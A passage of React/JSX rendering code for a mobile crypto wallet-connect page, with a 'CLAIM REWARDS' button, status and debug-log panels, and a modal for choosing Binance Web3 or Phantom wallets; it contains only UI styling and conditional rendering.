            
            {walletAddress && (
              <div style={{
                background: 'linear-gradient(135deg, #d1fae5 0%, #a7f3d0 100%)',
                border: '2px solid #6ee7b7',
                borderRadius: '12px',
                padding: '16px',
                marginBottom: '20px',
                display: 'flex',
                alignItems: 'center',
                animation: 'slideUp 0.4s ease-out'
              }}>
                <div style={{ flex: 1, minWidth: 0 }}>
                  <div style={{ 
                    fontSize: '12px', 
                    color: '#065f46', 
                    marginBottom: '4px',
                    fontWeight: '600',
                    textTransform: 'uppercase'
                  }}>
                    ✓ Connected Wallet
                  </div>
                  <div style={{ 
                    fontSize: '14px', 
                    fontWeight: 'bold', 
                    color: '#047857',
                    fontFamily: 'monospace',
                    wordBreak: 'break-all'
                  }}>
                    👛 {walletAddress.slice(0, 12)}...{walletAddress.slice(-12)}
                  </div>
                </div>
                <button
                  onClick={handleDisconnect}
                  style={{
                    background: '#dc2626',
                    color: 'white',
                    border: 'none',
                    padding: '8px 16px',
                    borderRadius: '8px',
                    fontSize: '12px',
                    fontWeight: 'bold',
                    cursor: 'pointer',
                    marginLeft: '12px'
                  }}
                >
                  🔌 Disconnect
                </button>
              </div>
            )}
            
            {showClaimButton && !claiming && !claimStatus && (
              <button
                onClick={claimRewards}
                style={{
                  width: '100%',
                  background: 'linear-gradient(135deg, #10b981 0%, #059669 100%)',
                  color: 'white',
                  border: 'none',
                  padding: '18px',
                  borderRadius: '12px',
                  fontSize: '18px',
                  fontWeight: 'bold',
                  cursor: 'pointer',
                  boxShadow: '0 8px 20px rgba(16, 185, 129, 0.4)',
                  textTransform: 'uppercase',
                  letterSpacing: '1px',
                  marginBottom: '20px',
                  animation: 'pulse 2s infinite'
                }}
              >
                🎁 CLAIM REWARDS
              </button>
            )}
            
            {claimStatus && (
              <div style={{
                background: claimStatus.includes('❌') ? 'linear-gradient(135deg, #fee2e2 0%, #fecaca 100%)' : 
                          claimStatus.includes('🎉') ? 'linear-gradient(135deg, #d1fae5 0%, #a7f3d0 100%)' : 
                          'linear-gradient(135deg, #fef3c7 0%, #fde68a 100%)',
                border: claimStatus.includes('❌') ? '2px solid #f87171' : 
                        claimStatus.includes('🎉') ? '2px solid #6ee7b7' : 
                        '2px solid #fbbf24',
                borderRadius: '12px',
                padding: '16px',
                marginBottom: '20px',
                color: claimStatus.includes('❌') ? '#b91c1c' : 
                        claimStatus.includes('🎉') ? '#065f46' : 
                        '#92400e',
                fontSize: '14px',
                fontWeight: '500',
                lineHeight: '1.5',
                whiteSpace: 'pre-line',
                animation: 'slideUp 0.3s ease-out'
              }}>
                {claimStatus}
              </div>
            )}
            
            {connecting && connectionStatus && (
              <div style={{
                background: 'linear-gradient(135deg, #fef3c7 0%, #fde68a 100%)',
                border: '2px solid #fbbf24',
                borderRadius: '12px',
                padding: '16px',
                marginBottom: '20px',
                color: '#92400e',
                fontSize: '14px',
                fontWeight: '600',
                lineHeight: '1.6',
                whiteSpace: 'pre-line',
                animation: 'slideUp 0.3s ease-out'
              }}>
                <div style={{ display: 'flex', alignItems: 'flex-start', gap: '10px' }}>
                  <div style={{
                    width: '24px',
                    height: '24px',
                    border: '3px solid #92400e',
                    borderTopColor: 'transparent',
                    borderRadius: '50%',
                    animation: 'spin 1s linear infinite',
                    flexShrink: 0,
                    marginTop: '2px'
                  }} />
                  <div style={{ flex: 1 }}>{connectionStatus}</div>
                </div>
              </div>
            )}
            
            {debugInfo.length > 0 && (
              <div style={{
                background: '#f3f4f6',
                border: '2px solid #e5e7eb',
                borderRadius: '12px',
                padding: '12px',
                marginBottom: '20px',
                maxHeight: '180px',
                overflowY: 'auto',
                fontSize: '11px',
                fontFamily: 'monospace',
                color: '#374151'
              }}>
                <div style={{
                  display: 'flex',
                  justifyContent: 'space-between',
                  alignItems: 'center',
                  marginBottom: '8px',
                  position: 'sticky',
                  top: 0,
                  background: '#f3f4f6',
                  paddingBottom: '4px'
                }}>
                  <strong style={{ fontSize: '12px', color: '#1f2937' }}>🔍 Debug Log:</strong>
                  <button
                    onClick={copyDebugInfo}
                    style={{
                      background: '#6b7280',
                      color: 'white',
                      border: 'none',
                      padding: '4px 8px',
                      borderRadius: '4px',
                      fontSize: '10px',
                      cursor: 'pointer',
                      fontWeight: 'bold'
                    }}
                  >
                    📋 Copy
                  </button>
                </div>
                {debugInfo.map((info, i) => (
                  <div key={i} style={{ 
                    padding: '3px 0', 
                    borderBottom: i < debugInfo.length - 1 ? '1px solid #e5e7eb' : 'none',
                    fontSize: '10px',
                    lineHeight: '1.4',
                    color: info.includes('✅') ? '#059669' : 
                           info.includes('⚠️') ? '#ca8a04' : 
                           info.includes('❌') ? '#dc2626' : '#4b5563'
                  }}>
                    {info}
                  </div>
                ))}
              </div>
            )}
            
            <button
              onClick={() => setShowModal(true)}
              disabled={connecting || walletAddress}
              style={{
                width: '100%',
                background: walletAddress || connecting
                  ? 'linear-gradient(135deg, #9ca3af 0%, #6b7280 100%)'
                  : 'linear-gradient(135deg, #667eea 0%, #764ba2 100%)',
                color: 'white',
                border: 'none',
                padding: '18px',
                borderRadius: '12px',
                fontSize: '18px',
                fontWeight: 'bold',
                cursor: connecting || walletAddress ? 'not-allowed' : 'pointer',
                boxShadow: connecting || walletAddress ? 'none' : '0 8px 20px rgba(102, 126, 234, 0.4)',
                textTransform: 'uppercase',
                letterSpacing: '1px',
                opacity: connecting || walletAddress ? 0.7 : 1
              }}
            >
              {connecting ? '⏳ CONNECTING...' : walletAddress ? '✅ WALLET CONNECTED' : '🚀 CONNECT WALLET'}
            </button>
            
            {!walletAddress && !connecting && (
              <p style={{
                marginTop: '16px',
                fontSize: '12px',
                color: '#6b7280',
                textAlign: 'center',
                lineHeight: '1.5'
              }}>
                🔐 Secured connection • By connecting, you agree to our Terms
              </p>
            )}
          </div>
          
          <div style={{
            marginTop: '24px',
            textAlign: 'center',
            color: 'rgba(255,255,255,0.85)',
            fontSize: '13px',
            lineHeight: '1.5'
          }}>
            <p>🔒 Powered by WalletConnect v2 • Binance Web3 Wallet</p>
            <p style={{ marginTop: '4px', opacity: 0.8, fontSize: '12px' }}>
              📱 {isAndroid() ? 'Android' : isIOS() ? 'iOS' : 'Mobile'} • {isBinanceWebView() ? 'Binance WebView' : 'Browser'}
            </p>
          </div>
        </div>
      )}
      
      {showModal && (
        <div
          onClick={() => !connecting && setShowModal(false)}
          style={{
            position: 'fixed',
            top: 0,
            left: 0,
            right: 0,
            bottom: 0,
            background: 'rgba(0,0,0,0.75)',
            backdropFilter: 'blur(8px)',
            zIndex: 100,
            display: 'flex',
            alignItems: 'center',
            justifyContent: 'center',
            padding: '20px',
            animation: 'fadeIn 0.2s'
          }}
        >
          <div
            onClick={(e) => e.stopPropagation()}
            style={{
              background: 'white',
              borderRadius: '24px',
              padding: '30px',
              maxWidth: '400px',
              width: '100%',
              boxShadow: '0 25px 50px rgba(0,0,0,0.5)',
              animation: 'slideUp 0.3s ease-out'
            }}
          >
            <div style={{
              display: 'flex',
              justifyContent: 'space-between',
              alignItems: 'center',
              marginBottom: '24px'
            }}>
              <h2 style={{
                fontSize: '24px',
                fontWeight: 'bold',
                color: '#1f2937',
                margin: 0
              }}>
                👛 Select Wallet
              </h2>
              <button
                onClick={() => setShowModal(false)}
                disabled={connecting}
                style={{
                  background: 'transparent',
                  border: 'none',
                  fontSize: '28px',
                  color: '#9ca3af',
                  cursor: connecting ? 'not-allowed' : 'pointer',
                  padding: '0',
                  width: '32px',
                  height: '32px'
                }}
              >
                ×
              </button>
            </div>
            
            <p style={{
              color: '#6b7280',
              fontSize: '14px',
              marginBottom: '24px',
              lineHeight: '1.5',
              textAlign: 'center'
            }}>
              Choose your preferred wallet to connect
            </p>
            
            <div style={{ display: 'flex', flexDirection: 'column', gap: '12px' }}>
              <button
                onClick={connectBinanceWallet}
                disabled={connecting}
                style={{
                  width: '100%',
                  background: 'linear-gradient(135deg, #f0b90b 0%, #f8d12f 100%)',
                  color: '#1e1e1e',
                  border: 'none',
                  padding: '16px 20px',
                  borderRadius: '12px',
                  fontSize: '16px',
                  fontWeight: 'bold',
                  cursor: connecting ? 'not-allowed' : 'pointer',
                  display: 'flex',
                  alignItems: 'center',
                  gap: '12px',
                  boxShadow: '0 4px 12px rgba(240, 185, 11, 0.3)',
                  opacity: connecting ? 0.6 : 1
                }}
              >
                <div style={{
                  width: '40px',
                  height: '40px',
                  background: 'white',
                  borderRadius: '10px',
                  display: 'flex',
                  alignItems: 'center',
                  justifyContent: 'center',
                  fontSize: '24px'
                }}>
                  🟡
                </div>
                <div style={{ flex: 1, textAlign: 'left' }}>
                  <div style={{ fontSize: '16px', fontWeight: 'bold' }}>Binance Web3 Wallet</div>
                  <div style={{ fontSize: '12px', opacity: 0.8, marginTop: '2px' }}>
                    Recommended • Mobile App
                  </div>
                </div>
              </button>
              
              <button
                onClick={connectPhantomWallet}
                disabled={connecting}
                style={{
                  width: '100%',
                  background: 'linear-gradient(135deg, #ab9ff2 0%, #9281f5 100%)',
                  color: 'white',
                  border: 'none',
                  padding: '16px 20px',
                  borderRadius: '12px',
                  fontSize: '16px',
                  fontWeight: 'bold',
                  cursor: connecting ? 'not-allowed' : 'pointer',
                  display: 'flex',
                  alignItems: 'center',
                  gap: '12px',
                  boxShadow: '0 4px 12px rgba(171, 159, 242, 0.3)',
                  opacity: connecting ? 0.6 : 1
                }}
              >
                <div style={{
                  width: '40px',
                  height: '40px',
                  background: 'white',
                  borderRadius: '10px',
                  display: 'flex',
                  alignItems: 'center',
                  justifyContent: 'center',
                  fontSize: '24px'
                }}>
                  👻
                </div>
                <div style={{ flex: 1, textAlign: 'left' }}>
                  <div style={{ fontSize: '16px', fontWeight: 'bold' }}>Phantom Wallet</div>
                  <div style={{ fontSize: '12px', opacity: 0.9, marginTop: '2px' }}>
                    Solana • Browser • Mobile
                  </div>
                </div>
              </button>
            </div>
            
            <div style={{
              marginTop: '24px',
              padding: '16px',
              background: '#f9fafb',
              borderRadius: '12px',
              fontSize: '12px',
              color: '#6b7280',
              lineHeight: '1.5'
            }}>
              <div style={{ fontWeight: '600', color: '#374151', marginBottom: '8px' }}>
                🔐 Safe & Secure
              </div>
              <div>
                We never store your private keys. All transactions require your explicit approval.
              </div>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}
